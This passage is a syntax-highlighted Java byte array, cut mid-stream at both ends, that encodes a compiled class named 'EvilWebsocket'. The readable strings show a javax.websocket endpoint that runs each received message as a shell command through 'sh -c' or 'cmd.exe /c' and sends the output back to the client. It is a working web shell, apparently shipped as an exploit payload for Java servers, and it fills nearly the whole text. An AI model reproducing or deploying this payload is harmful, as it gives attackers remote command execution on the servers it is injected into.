class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">62</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">113</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">114</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">117</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">119</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">118</span>, <span class="number">0</span>, <span class="number">119</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">121</span>, <span class="number">0</span>, <span class="number">122</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>, <span class="number">124</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">125</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">0</span>, <span class="number">127</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">127</span>, <span class="number">0</span>, -<span class="number">126</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">125</span>, <span class="number">0</span>, -<span class="number">124</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">123</span>, <span class="number">0</span>, <span class="number">117</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">122</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">121</span>, <span class="number">0</span>, -<span class="number">119</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">117</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">115</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">114</span>, <span class="number">0</span>, -<span class="number">113</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">36</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">67</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">68</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">78</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">59</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">84</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">4</span>, <span class="number">61</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">78</span>, <span class="number">45</span>, -<span class="number">58</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">45</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">28</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, <span class="number">58</span>, <span class="number">4</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">13</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">58</span>, <span class="number">5</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">17</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">6</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">19</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">20</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">58</span>, <span class="number">7</span>, <span class="number">42</span>, -<span class="number">76</span>, <span class="number">0</span>, <span class="number">22</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">77</span>, <span class="number">44</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">26</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">0</span>, -<span class="number">117</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span 